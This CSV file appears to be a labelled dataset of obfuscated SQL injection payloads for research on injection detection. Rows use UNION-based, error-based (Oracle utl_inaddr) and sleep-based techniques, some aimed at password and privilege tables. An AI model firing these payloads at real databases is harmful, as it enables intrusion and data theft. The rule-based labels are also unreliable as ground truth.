payload,sqli_type,db_engine,evasion_tech,confidence,classification_method,source,context
"ADmiN""` ) Or )(,^""0O6"" %*lIkE< ""2b0X1"" And.TRUe` AnD %""2O]L"" Not LiKE ""8X0x0B0O12o]Lq""&OR 0xFdE NoT = (sElECt (SElEct 0XfDe)) Or?(seLECt 0O4)$aNd ';SAu'`NOT likE ';Sauv')&& '^Of'='^oF' && (SElECT (SeLect 2545))!=(sEleCt (SElEct 1346)) oR!(selecT 0)#$|",unknown,unknown,case_variation|function_alternative,0.0,rule,sqliv5_json,unknown
"selECT *'FROm USErS where Id LiKE '0b100''*$|0X1 Or (SELEcT 0x1), = (SeleCT 1))And TrUE$OR(fALSE;--;0O6'AwgbH",unknown,unknown,case_variation|function_alternative,0.0,rule,sqliv5_json,unknown
"adMIn'or 0X6 [= [6B8 \Or Or=fAlSe&or ""u7ua]""?!= ""u2o0o3b101uA]""{ OR ""H"" noT lIkE ""H"" or!FaLSE;oR/* cYa;r]a*/""S"" nOt{like ""s""#_'' = 'wi 5le{T}`9BH",unknown,unknown,comment_whitespace|inline_comment|function_alternative,0.0,rule,sqliv5_json,string_double_quote
"/*/ l*/SeleCT * FRoM/**/usERs<WHerE ID LIKE '9' `oR !<(SeLEcT 0b0b09)$unioN sELEct 0o0x0o0O9,vErsIOn ( ?) }Or+(sELECT 0x0x0) and TrUE && 0x5' AND True OR (SELECT (SELECT (SELECT (SELECT 0)))) OR False -- 6' ja",union_based,unknown,case_variation|comment_whitespace|inline_comment|function_alternative,0.8,rule,sqliv5_json,string_single_quote
"SELEct *!froM usERS whErE iD^= '0X5' <UniOn SELeCT nUll,BaNner frOm V$VerSIon whERE&RowNUm ='1 aND+""Q""=""q"" AnD ""Bm""/*M */ NoT lIKe ""BM<"" oR 0xaAf<>5XaAF ANd (sElEct (SELECT (SELECT 1))) aND (SElECt (SELECT 1)) OR False -- 0b0b1100101B9'A<K:",union_based,oracle,case_variation|comment_whitespace|inline_comment|function_alternative,0.46,rule,sqliv5_json,unknown
"SELeCt * FRom usERS wHEre<ID ~= 2X1. <@ UnION SeLecT (SelecT 0o0x0),verSioN ( ) && ""v"" noT lIKE ""v""""` Or FAlsE aND ""Y`k`"" nOt LIkE ""y`k`5"" And TruE or (SeLEct (sElEcT (SElECT 0))) Or (sElECt 0X542) <> 0o2540]--/6x5B9",union_based,unknown,case_variation|function_alternative,0.8,rule,sqliv5_json,unknown
"SeLEcT * FROM uSerS+wheRE iD LikE) '9' unIOn}sElecT $ _,@@vERsIOn aNd 'e oh';not LIKE 'E oH!' anD TRUE or faLse AND ""Y"" NOT lIkE ""YA"" or faLsE OR (SELECT (SELECT 4590))!=(SELECT 4590) OR False -- 4']=",union_based,mssql,case_variation|function_alternative,0.46,rule,sqliv5_json,unknown
"selECt * FrOm{UserS wherE Id = 7x1 oR<"" ) ;"" OR (sELEct 0x1) liKE (seLeCT (SELECT (SELECT 1)))+OR 0X4 oR ""kv|"" NOT LIKE ""Kv|"" AND 1 OR False AND "",P""!="",P="" -- (SELECT 6) igxo",unknown,unknown,case_variation|function_alternative,0.0,rule,sqliv5_json,string_double_quote
"selEcT * fRoM UsERS whErE/**/ID = +5b1 or ""{1"" = (SeLeCT 3) Or 0x1. = (seleCT 1) && ""5:""=""5:"" aNd)""h"" NOT LIKE ""h&"" OR FAlsE AND AND True#(SelEct (SELECT 1)) Or ""/"" Not lIke ""/"" oR fAlSE -- (SELECT 1) yE hL2rs",unknown,unknown,case_variation|comment_whitespace|inline_comment|function_alternative,0.0,rule,sqliv5_json,string_double_quote
"SELecT * FroM,USers Where id Like (SELeCt (sElect 0x4)) oR$0o1/**/and (SElECT 0x1) And 'A' NOT = 'a0B0B8065' ANd TruE aNd,'A' NOt likE 'A)' oR^ FAlsE AnD truE or (SEleCT (SeleCt (selecT (sELEcT 0)))) Or (sElEcT 0) And tRuE#"", UnioN sELeCt=vErsION ( < ) ,vERsIoN ( ) -- 0X0B0B1:X8y",union_based,unknown,case_variation|comment_whitespace|inline_comment|function_alternative,0.8,rule,sqliv5_json,unknown
"SeleCt}* fROm uSErS_wHERE Id lIke 0x0}OR 0x0b710o1 oR (seLeCt (seLecT (sElECt (SELECT (SELECT 9690)))))`<> 8XE6A AnD ""yxMG&""!=""yXmg&l"" OR ""P;"" nOt LikE ""P;"" oR FALSe Or FalSe AND 1 Or ""q"" Like ""Q'""#""? UNION SEleCT 'a',vErSion ~( ) -- 0b0o1",union_based,unknown,case_variation|function_alternative|hex_string,0.8,rule,sqliv5_json,string_double_quote
"selEct * frOm UseRS whErE ID != '8' UniOn)SELect @+@5x0o7B0o0O0x1,vERsION ( ; ^)? anD+true && ""2x{2"" not`LIke ""2X{4j"" oR FALSe aNd truE AnD(TrUE aND tRuE Or "" ""<>"" "" Or FALSE -- 1',fbG!Z",union_based,unknown,case_variation|function_alternative,0.8,rule,sqliv5_json,unknown
"*SelECt * frOm UsERs WhERE id ^= ""(sElECT (sELect (SeLecT 1)))<+ ( \+ )) /unIoN/seLEct NuLl,@@VErsIon: aNd (selecT 7674)%iN/**(D3$*/((sELect (sElEcT-(seLEct 2463))),0o0x9a1X1,(SELeCT (seLeCt (SELECT 2469)))) anD ''' NOt liKE '';'""AnD ""ZJ'"" nOt lIKe ""zJ'9"" or ""&"" noT lIkE ""&"" && true and 'UtO'!='UtO.']Or FAlSe*oR falsE Or fAlse AND True -- 3X0O0O0o1<sc4f3ySJ",union_based,mssql,case_variation|inline_comment|function_alternative,0.46,rule,sqliv5_json,unknown
AND 1O1O0O7b01O0b10 = utL_INaDDr.GET_HoST_ADdREss /* AND True OR False#jJo*/(: % ( ;SeleCT BANneR frOM v$vERSIon wHErE RoWnum = ?(sELect (SeLect (SELECT (SELECT 1)))) ) ) && 'I' lIke 'i*mo,unknown,oracle,case_variation|comment_whitespace|inline_comment|function_alternative,0.11,rule,sqliv5_json,unknown
"sELecT *!FRom uSErS whERE Id = 0O0O5 <@$_ Or (sElECt (SELECT 0)) ;likE 0b0X6"" AND 4X6||';':NOT Like ';'/*~) }r*/--`(sElECt (sELEcT 0X4))=m",unknown,unknown,case_variation|comment_whitespace|inline_comment|function_alternative,0.0,rule,sqliv5_json,string_double_quote
"ANd 0B2o6 LIke UtL_INadDr.Get_HOst_AdDresS ( ( ? sEleCT DIstInCT ( COLumn_NaMe ) FRom (- SelEcT DiSTInct ( ColUMn_naMe ) , roWnum As LImIt From alL_Tab_ColUmnS ) oR (SelEcT (sElecT 2998)) LIKE (SelECt 0x1f3f) or fALse Or FAlSe && TRue OR}FalSE Or 0xb69 not lIKE (SELECT 2922) AnD True# WheRe;LImIt [LikE? 0x7O0B10o0o0O0O10 ) ) ANd 'I' liKe 'iew{HHgZ",error_based,oracle,case_variation|function_alternative|hex_string,0.46,rule,sqliv5_json,unknown
"SELecT * frOm?uSErs+whERE ID; LIKE (seLect 0O7b0b0o0O0o2B0x5) Or $+<$ uNiON selECT.2O3x0o2,@@VErsION/ or` 'P' LIkE 'P<' aND ?TRUe Or 2X5 aND/**/tRUE Or:faLsE -- 0B1EF`u]S]8I",union_based,mssql,case_variation|comment_whitespace|inline_comment|function_alternative,0.46,rule,sqliv5_json,unknown
"sELeCt[* froM UsErs WHeRE iD Like {(sELEcT 0X0x6):Or ""@%"" Or(7X1=(SElECt 0b0o1) aND ""/"" noT LIkE ""/r"" oR FaLsE oR ](SeLeCt 3x0) && 0O0 Or FALsE}-- 4cakT zj",unknown,unknown,case_variation|function_alternative,0.0,rule,sqliv5_json,unknown
"seLect&gQ(EL*/*mfDgu*/FRoM@USeRS WhERE|iD)=>0X6B1 oR $<\*unION SELect (selECt 0o6o7o0x8),@@verSION ;or 3X0}oR '&'=NOt LikE '&' and TRUE && True -- (selecT (sELecT!0xBE)):5O3v",union_based,mssql,case_variation|comment_whitespace|inline_comment|function_alternative,0.46,rule,sqliv5_json,unknown
"selECt * fROm UsERS wHEre{id;= (SeLect 1) + ( 0B100 [) "" unIOn[seLect (selEcT (SELECT 1)),BannER From v$vERSIOn wHeRE rOWNuM LIKE 1 &&} TRue && ""c0o5"" not liKE ""c5b"" or FaLSe AND 4303=0x10cf OR False/**/-- 1B] W",union_based,oracle,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string,0.41,rule,sqliv5_json,unknown
"SELect * fRom:UserS Where ID=0x0O11x0X8 OR \+<\ UNion<SelEct}(SEleCT (SeLEct (SeLeCT (SeLeCT (select](SELECT (SELECT 1))))))),@@Version aNd 'BD|' LIKE 'Bd|' aND tRuE aNd (seleCt 1x3O10) AND ""Vu"" NOt LIKe ""vud"" anD (SeLect 0x1) oR ""(qj"" Not Like ""(qj"" and+TRuE && TrUE OR ""%""<>""%"" OR FalSE --}1G",union_based,mssql,case_variation|function_alternative,0.41,rule,sqliv5_json,string_double_quote
"sElECT)* FroM<UseRs wherE id lIke@7b0B2b3b0o0o9^union sELEcT @?_,verSiON`$( .^)/*X(>cr0o6? b&LY)mu*/ oR ""}""=""}R""<AND ""s3"" lIkE ""S3""/**/ Or &(selECt&0x6x46bE) NOT liKe (SeLeCt 6x26bE) and,""@?"" noT LIke ""@?T"" ANd tRue aND trUE||(seLECT (seleCt (selecT (sELEct (SelecT 0x1))))) or fALse -- 0X0b1x0o2,]&mwMl}k}fkZK@(SELECT 4)^",union_based,unknown,case_variation|comment_whitespace|inline_comment|function_alternative,0.8,rule,sqliv5_json,unknown
sElecT * froM uSeRs WHerE Id=(seLeCT (sELect (SELEcT (sEleCt 5)))) + ( $+ )= OR:0X1 = 2x1/**/anD tRUe or 0O0 And < TRUe AND True AND '{Ux' NOT LIKE '{UxF' -- (selECT (SELECT (SELECT 2)))$,unknown,unknown,case_variation|comment_whitespace|inline_comment|function_alternative,0.0,rule,sqliv5_json,string_single_quote
SelEcT * From*USERs/whERe id./**/ LIKE '2b5' <@$_ OR (SelEct (SeLect (SElEct 0x1))) liKE\ 2x4 and tRuE OR False -- 1'qU,unknown,unknown,case_variation|comment_whitespace|inline_comment|function_alternative,0.0,rule,sqliv5_json,unknown
"""Hi""""# ).</*Y<*lY.veDNbh:MYRd7X6p:(SELECT (SELECT 2))](y)0o0B101115!Z WK41Ov*/$OR ; (< """"A""""*{lIke """"a""}[[c",unknown,unknown,case_variation|inline_comment|function_alternative,0.0,rule,sqliv5_json,string_double_quote
"and 3O0o0b3o1 LIkE utL_iNADdr.GET_HOST_adDRess ]( ( sELeCT distInct ( COLUMn_NaME ) FroM ( seLecT diStIncT ( cOLUmN_NAMe ) ;, ROwnUM as liMiT fROM All_TAB_colUmNs ) WheRe LimiT lIke (selECT (sELeCt (seleCt (SeLecT 0b1004)))) *), ) && 'I' LikE 'I",unknown,oracle,case_variation|function_alternative,0.06,rule,sqliv5_json,unknown
"SELecT * fRom USers/whERE Or+(SeLEct (sElect 0X5fa)) !=?(SelECt (sELect 0X80e)) && tRUE oR?'!' NOt Like '!' AnD 'oj'?Like 'OJ' oR faLse And (SELECT 4632)!=(sELect (selEcT 6833)) OR 0x0 Or (SELECT 0) or FalSe#iD =['6' uNIon SElEct/+\ OR+0b10X0#,@@VErSION --+0o0o0'U6,X",union_based,mssql,case_variation|function_alternative,0.46,rule,sqliv5_json,unknown
"seLEcT>* froM useRs WHERE Id =: 0B2X1 or "".;"" OR (SElect (SELECT (SELECT 1))) = (sElECt (SelEcT 0x5O4)) && '?'>' not LiKe '?'>}' aNd True --]1",unknown,unknown,case_variation|function_alternative,0.0,rule,sqliv5_json,string_double_quote
"sEleCT>* FroM useRS WheRE Id) =/*)Hxz`Elo&*/ 0O0b0O1 UNIOn seLEct (SELECT (SELECT (SELECT (SELECT 1)))) 0b1a,vERSIon ( ): &&!TRUE or FALsE Or ""k "" NOT LikE ""K "" or faLse OR fAlSE ANd ""WL"" NOt LIkE ""wlN"" -- (sElECt#0O0O0X1)/8s",union_based,unknown,case_variation|comment_whitespace|inline_comment|function_alternative,0.8,rule,sqliv5_json,string_double_quote
"]UnIon $( sELECT[nUll, nUlL, null, NulL, (< sElecT/*(SELECT 1)\""VcjM;*/@@veRSiON ~{) }) &&'Myoa' nOt Like 'MYoac' && tRue Or faLSE>OR 'd'<>'d'^AND True-OR,False AND@(SELECT{(SELECT 8x0o4)) AND True --",union_based,mssql,case_variation|comment_whitespace|inline_comment|function_alternative,0.46,rule,sqliv5_json,unknown
"SELect * fRoM uSerS]wherE/*Y0|p(*(sElECt 0x0)*PELPRN;Y*/Id ]= 0X0X0x1;oR 0X0B1 OR 'CS<'<>'cs<'`or FAlSE OR*""Pl5Z"" NoT liKe ""pL5z"" OR falSe;Or (SeLect (selEct^(SELECT 0))) AnD TRUE anD tRue OR False AND 'M% %F'!='M% �'#"" ( * UnIOn seLECt 'A',vERSIOn (( ) -- 1Q\l",union_based,unknown,case_variation|inline_comment|function_alternative,0.8,rule,sqliv5_json,string_single_quote
"SELEct *&fRoM UsErs WHERe iD{ = 1X9 or ""{( ) /""~OR 3b5=(sELECT (seLect (seLEcT (selEcT (SelecT (SeLECT (sELECT 5))))))) aNd 0x9 or ""5"" != ""9B101"" And 0X1/**/OR ""Bja"" NOT LIKE ""bJa"" aNd TRUE && ""2I""=""2I"" -- (SElECt 1)!",unknown,unknown,case_variation|comment_whitespace|inline_comment|function_alternative,0.0,rule,sqliv5_json,string_double_quote
"SElEcT * fROm UserS]WheRE Id [=/*0B?A*/ (SeLeCt 5x0o1) Or "",\ ) ""=2x0b6O0b0x0o0b1!@or (SelecT 0x4)=(SELECT*(SELECT (SELECT 1))) aNd?(SELECT 8587) NOT LIKE 8578 && ""W%"" NOT LIKE ""W%("" OR False OR False -- 0O0b1nY/K)Oui2#z1D",unknown,unknown,case_variation|comment_whitespace|inline_comment|function_alternative,0.0,rule,sqliv5_json,string_double_quote
"SElEct * FrOM usERs wHERE Id; LIke (seleCT 0X0b7X0b0O8O1)!-@<@ UNIoN selecT VErsIOn ( )/**/ ,VeRsION ( ) oR falsE anD ""KNyC"" not likE ""kNYCE"" OR (SelECt (SELECT (SELECT 0))) AnD TRUE -- 0O1_ ]Jj",union_based,unknown,case_variation|comment_whitespace|inline_comment|function_alternative,0.8,rule,sqliv5_json,string_double_quote
"sELEcT *""FRoM USeRS|WhERe ID| Like 0x1 OR ""].""`or%(SeleCt (SElect (sELEct (select (selEct (SELect 2)))))) =:3x5B4 AnD 'q.\ ' NOT lIkE 'q.\ D'\-- 0o2",unknown,unknown,case_variation|function_alternative,0.0,rule,sqliv5_json,unknown
"sElecT * froM}USErS wHerE+iD 'likE/**/@4b11x3 Or _"") ) _( "" LIke 0x0o2 oR*(SELEcT (SEleCt (seleCT 6x2)))/*p(ij])Z}<pO\D*/ =. (selEct)0x0) aNd 0b0x1985E0X781bBC nOT LIkE (selEct 0X22F1) oR 0B0X0O3753 NOT liKE 2x1065 or faLSe/**/ and -(SElecT 6x0B1) oR,0X4X0x0 or fAlSe && ~ ""@"" LIke ""@"" or falsE aND?TRue And]TruE(Or falsE:oR^faLsE or FaLse oR fALsE OR (SeLEcT (selEcT (sELecT 0))) --)(SElEct (SelEct 0x0X1O0X6O1))^wpT{j",unknown,unknown,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string|scientific_notation,0.0,rule,sqliv5_json,unknown
aDMin'^{). \oR<'5o80o0B4o0O9O5B0b1101111' +LiKE '1,unknown,unknown,function_alternative,0.0,rule,sqliv5_json,unknown
")seLECT<* fROm users WhErE""id = 3x4+or "" ) ;$"" or (SELECT 9) lIke 2x9o0B0o310 OR (SeLecT (sElEcT 0)) OR 'Tg' NOT like 'TG' --)4",unknown,unknown,case_variation|function_alternative,0.0,rule,sqliv5_json,string_single_quote
"and 9o0o13x0o0b0X0B0O0B10110105 LIke uTL_inadDR.GET_hoST_AddRess ( ( SEleCT DiSTIncT ([ taBLE_NaME ) FROm ( sElECt DISTincT ( TABlE_namE ) ., ROWnuM:aS lImiT fROm syS.aLl_tablEs] ) WHERe lImIt likE (sELeCT (sELecT (sELECT (sELEct 0X5)))) ) ) /AxRb.wP?xJ} \do+k*/ jlW-5v*/aND 'I' Like 'i",error_based,oracle,case_variation|function_alternative,0.46,rule,sqliv5_json,unknown
"-SELect * From_Users WheRE id=(sElecT 0X5) OR 0o0b0b1111X4 ANd TruE ANd^0o3114 LiKe /**/(SElECt (Select (SeLeCt 0X5e8))) oR% 0X0b0B2 anD ""Q~L+"" noT LikE ""Q~l+V"" And TrUe&and (SeLEcT (sElECt (SeLect (seleCT 9x256b)))) not lIKE (sELeCt 0x0X13b4) ANd 0B0x0B1 Or FAlSE and/ &RO*/M_@*/TRue||false OR fAlSe Or falSe#"" ( uniON SeLEct)vErSion ( )~ ,vErSIOn %( ) --)2h/{dl: H^ozP",union_based,unknown,case_variation|comment_whitespace|inline_comment|function_alternative|scientific_notation,0.8,rule,sqliv5_json,unknown
"sELeCT * FrOM*uSErs WHEre id LIke '5'&uNIon>SELEcT \.,@@vERSIon or faLse Or FALSE AND True OR False -- 4'fN}s",union_based,mssql,case_variation|function_alternative,0.46,rule,sqliv5_json,unknown
"SELECt|* FrOm USeRS]WhERe Id |= (sElEcT{(SeleCT 0x7)) OR (SeLEct 0b0X8) aND truE oR fAlse And ""GI"" nOT likE ""GiM"" OR False#""0O7 UNIon sEleCT 'a',vERsiOn ( ) -- 1G\]Up*^O",union_based,unknown,case_variation|function_alternative,0.8,rule,sqliv5_json,string_double_quote
"SelecT * FRom UserS wHERE id=0X1 OR/**<mWGO;l)1szw*/0X7;aND "",""{lIKe\"",""AND(SELeCt 0X0o0b10101011111010)`lIKe (sEleCt 0x12eC) oR ""0o0x0x4X4"" NOt LIkE ""0x0x4"" or (SeLecT (seLeCt (SeLECt 0))))AND TruE aNd.0X5(aND 6X9o1 and|tRue]anD ""U""=""u"")Or>""H"" nOt LiKE ""h"" Or FalsE aND TruE ANd ""S"" lIke ""S"" And 0x1129 Not LiKe 8X112A or ""S"" NOT lIKE ""s"" or falSe oR ""6A""=""6Al"" AND TrUe oR FaLse oR fAlsE or FAlSE>oR (SELECT (SELECT 0))#"". LiKE~0b0x5 UniOn{SeLeCT (selEcT (SElECT 4X1)),VErsion ( ) -- 5lEowm8lbNUS]s",union_based,unknown,case_variation|inline_comment|function_alternative|hex_string,0.8,rule,sqliv5_json,string_double_quote
"+SElEcT * FROM userS WheRe ID{ likE 0x0O3 Or @ ANd (SeLECT (SEleCt 2x7))*Or ""1""=NoT LiKe ""1""/*dRGbE*/ OR FalSE Or FaLsE#""{ = =(SELecT&(SElecT (SeLECT 9))) uNIOn SeLeCT 0o4,veRsION ~( ) --.1lU",union_based,unknown,case_variation|comment_whitespace|inline_comment|function_alternative,0.8,rule,sqliv5_json,unknown
"SeleCT * From\uSERs/**/WhErE id LIKE 0o2 unIon SeLect 3x6 0x0b0$,VERSiON ( ; ) ANd ""w"" NOT LIKE ""wM""/**/ OR False OR (SELECT (SELECT 0)) OR False --_0x3e",union_based,unknown,case_variation|comment_whitespace|inline_comment|function_alternative,0.8,rule,sqliv5_json,unknown
"`sELEcT * FROm UsERs WHeRe iD ~likE) 4X0b111x5x0o0o0. <@(UnION@SelecT<Version [( ; )! ,vErsIoN ( ) anD (sELECT 0O7) aNd 'n' NoT LIKe 'NJ'=] && ;,tRUE$and TrUe AND""0O0O4x0 ANd TRUE aNd?TrUE}-- 2B119qZ MlFqlGDzz:D",union_based,unknown,case_variation|function_alternative,0.8,rule,sqliv5_json,unknown
"sELECt * fRom)UserS wHeRe iD@= 0x4} oR !^""?_""}OR 0x3 like (SeLECT'0x1) anD TRUe oR (sEleCT (SelECT 3)) or FaLSE And ' BIg' NOT LIKE ' bigQ' -- 0O3p9",unknown,unknown,case_variation|function_alternative,0.0,rule,sqliv5_json,string_single_quote
"And (SELecT (SELECt (SEleCt (SELeCT (SELeCt (SeLEct 0B11X0O2)))))) LIKE uTL_inaddr.GEt_Host_aDdREsS ( ( _ SELecT diSTinCT Or FALse oR ""m""!=""M"" or FAlSE oR (SELECT 0x74c) NOT lIKe (SELECT 1868)#( ColUmN_nAMe ) fRoM (` sElECT DIStiNCT ( ColuMn_naMe/~""5e* ) , ROWNUm'As LiMIt from aLL_TAb_COlUmns ) $ wHerE@LimiT=2B0b0x0o21AX0o0o0B105B1 oR ""z>"" NOt LIKe ""Z>""# )> )< And 'i' Like 'i'$&z`;:",error_based,oracle,case_variation|function_alternative,0.41,rule,sqliv5_json,string_double_quote
"sELect * FRom uSERS whEre iD|= (SeLeCt (SELECt 0X5)) OR 1.oR (seLeCt (SELECT 0805))[Not lIKe (sELEcT 3805) && ' ' noT^ Like ' *' Or FalsE OR 0 AND True#""$ UnIon SELecT vErsion ( ) ,veRSION (< ) -- 1v :",union_based,unknown,case_variation|function_alternative,0.8,rule,sqliv5_json,numeric
"AnD (SELeCt 0X0o10X3b2O5o0x0b0O2x0o5); LIke Utl_inADdR.geT_HOSt_ADDresS (\ ( +(sElEcT distINCT ( grANtED_role\ ) & fRom; ( ?SEleCT DIStIncT ^( gRANted_ROLe ) -, rOWNUm As lIMIT FrOM dBa_ROlE_pRivs%WHerE GranTEE LiKe syS.loGInUSEr& )(/*Jeg/r|8zW>`%(SELECT 4) 0x3*/@wHeRe LimiT >= (sEleCT (sELect (SELeCT 2X0o0O0o0b0b0O7))) "") ) [ && 'i' LIke 'i",error_based,oracle,case_variation|comment_whitespace|inline_comment|function_alternative,0.46,rule,sqliv5_json,unknown
"sELeCt * FrOM<Users WHeRE Id = \(selecT (sElect (SeLecT 1))) Or "" ( /**/0x2"" Or@0B9 = 0X0b9 or ""t""%Not liKE ""T"" and (SELEct 0x0O376c) lIKe (seLect (Select (seLECT 1948))) oR""""e?m"" liKE ""e?M="" anD tRUe oR fALSe!-- 8'dkeZRZ",unknown,unknown,case_variation|comment_whitespace|inline_comment|function_alternative,0.0,rule,sqliv5_json,unknown
"AND(seLEcT (sELeCt (sELECt (SelEcT (SElECt (SELECT (sElECT (SeLEcT (SELECT 1))))))))) =,utL_iNaddr.get_hoSt_AddrESS ( ( SELecT DisTInCt ( pAssWoRD )) AnD trUE oR ""`"" NoT LIKe ""`""# FROm] ( SElECT dIStInCT ( PasSw Or D} ) , ROWnUM aS liMit FRom syS.uSeR$ ) WhERe?LiMIt lIkE 0x7B1b3 /*c*/ ) ) And#'I' = 'ITz",error_based,oracle,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string,0.46,rule,sqliv5_json,string_double_quote
"\SelECT * FroM USeRS WHEre iD ? && ""k""=""K""[ && (SElEcT (sEleCt (selECT (seLecT (SeLECT (SELEcT (SELeCt (SELECT (SELECT (SELECT (SELECT!(SELECT 0x1)))))))))))) oR (SelECT 9x0B2) oR ""C( }"" nOT LiKE ""c( }"" Or ""]k<"" Not LikE ""]k<"" , && TrUE oR ""_""=""_;"" aND/**/""eg<i""=""Eg<I"" AND ""z"" NOT LIKE ""zV""#== 7X7x0X9'+ @<0o4x0b1001 ANd ""0x3B101"" NOT LIke ""3S"" anD ""a""=""a"" &&-truE#'uNiON sElEcT""3,VerSION] ( $) -- 0o0B0o0X1+�D:[ d'Jjie}R*",union_based,unknown,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string,0.8,rule,sqliv5_json,string_double_quote
aDmIn'!~) or . ( '5'; =^ '2'* ANd (sELEct (SELEct (sEleCT 1))) Or '6' NOt@lIkE '1'(oR 0x0B0 or *'?' =.'?M' OR 0B0X1X0B0b0B0x0B0X3X0B0 or 0X0o4_ aNd& (SELEcT (SelEcT 0))]anD TRue Or'faLsE OR 0X0/ OR (selECT:(sElecT (sELEcT (SeLEct 0)))) anD TrUe'aND tRuE AnD TRUe aND (SElecT (sEleCt 1334)) nOt LIkE (sEleCt (sEleCt 1330)) or/*?!*/FAlsE and)^TRUE And TrUe#cIK2<U `w:m(91Pdb,unknown,unknown,case_variation|comment_whitespace|inline_comment|function_alternative,0.0,rule,sqliv5_json,string_single_quote
SelEcT * fROm USeRS whERe ID* like (SElEct 0x1) +%\+%$ OR 0B1 |lIKE 0x1 aND (SELECT'927) noT lIkE (SELECT (SELECT (SELECT 022)))+and '?b'`like '?b' OR FALsE OR False -- 1cI-{m,unknown,unknown,case_variation|function_alternative,0.0,rule,sqliv5_json,string_single_quote
"SElECt * FrOm UsErS WHERE iD,LIKE (SeleCT (sELEct (SElect 1))) % ( @\> ) oR (sElECT 1) like 4 ANd 0O21514~lIkE 6503 Or 'Gm' Not LiKE 'gM' oR FalSE oR fAlse or ""H""=""H,"" or (SELECT (SELECT 0)) and TRUe OR False --""5",unknown,unknown,case_variation|function_alternative,0.0,rule,sqliv5_json,unknown
"sELeCT * From usErs wHerE?id liKe '1' UNiON sELecT+(SELect (sElEct 3)),BAnnEr FROm v$VeRSIOn wHErE ROWnUm LIke 0X1 Or '=DK'='=DKt' and truE -- 5'P",union_based,oracle,case_variation|function_alternative,0.41,rule,sqliv5_json,unknown
"sELecT,* froM USers WHERE+ID = '8X4x9' Or;@ ( =(seleCT 0x1)>!) ; liKE (seLEcT (seLect 1)) unIoN Select (sELEct (sELECt (sELeCT 4))),VErSioN ;( ) Or 'eWH' LiKe 'Ewhg' && TRue{AND TrUe aND 'avH' LiKe]'aVH' AND ""Gj"" noT LiKe ""gJ="" AND TRUE AND TrUe -- 1'H_RSt",union_based,unknown,case_variation|function_alternative,0.7,rule,sqliv5_json,string_single_quote
?[OR |UNAme;lIke '%,unknown,unknown,function_alternative,0.0,rule,sqliv5_json,like_clause
"deClaRE @s vaRChaR (/**/ 0b0xc8/**/%) $:SeLecT/**/@S/**/ : $like "" /**/ 0O9x77014974666F0O0b100111100000010110111101000100100c61792097343A303a0x1ddA0x0b101010C eXeC, ({ @s {)^",unknown,unknown,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string,0.0,rule,sqliv5_json,unknown
"SELECT/**/*:fRom UsERS]WhErE id lIkE 0x6X4o7 +` (@ $+\%) unIoN sELEct NUll,@@versioN Or FalSe or fAlse(OR FalsE oR=False ANd (SELECT (sELEct (sEleCT 0XCd4)))!=0xDa0o7 Or ""lS"" NOt likE ""lS"" OR FALsE -- 0b0B",union_based,mssql,case_variation|comment_whitespace|inline_comment|function_alternative,0.46,rule,sqliv5_json,string_double_quote
";aND 0o5O0B0b110x0b0o0B1101110 =_UTl_iNAddR.GeT_HoST_aDDreSS :(( /( SELecT+DistincT ("" uSeRNamE )} fRom` ( SElecT'DISTinCt (! USeRnamE )] , RoWNUM!As LiMIT FRom sys.ALL_USERs )\ wHeRe LIMIt LIke 0B0O1B0b1111110011o0O0O0o0o0O1/ }); ) ; && 'i' LiKe 'i",unknown,unknown,case_variation|function_alternative,0.0,rule,sqliv5_json,unknown
"% ANd 9b0X5o0O0X6X3x0x0o0o0x6x1B509[={uTL_inADdr.GET_hOsT_aDDReSs) ( ( [(SelEcT;distiNct ( ^grAntED_roLe ) ^fROM < ( !seLEct dISTinCT ( gRAnTed_RoLE )/* * <gQp Q0O0b101Wfog; X67zZKoF4 $`l4,;*/ , ROWnUm As limIt froM DbA_Role_prIVs wheRe gRANtEe; likE sYs.LOGiNUsER ~)] wHERE lImiT ;lIKe (SeLect 0O1)] :) ? ) aND 'I'\@ LIKe 'I",unknown,oracle,case_variation|inline_comment|function_alternative,0.06,rule,sqliv5_json,unknown
"0o0X0O3B0O0x0b1 ) /*!r)&p~c?tNviGw*/ )? `oR SlEep` (: __TIme__ ) {AND 0X0B0b4o0B100111010000100000001000100001011111111011010110101100$nOT LIKe 0x0O53/ AnD "" 'v'`nOT lIkE 'vF' oR,False aNd>""m"" nOT LiKE!""Md"" OR>FalSe#. Ks]`C+{>",unknown,unknown,comment_whitespace|inline_comment|function_alternative,0.0,rule,sqliv5_json,string_double_quote
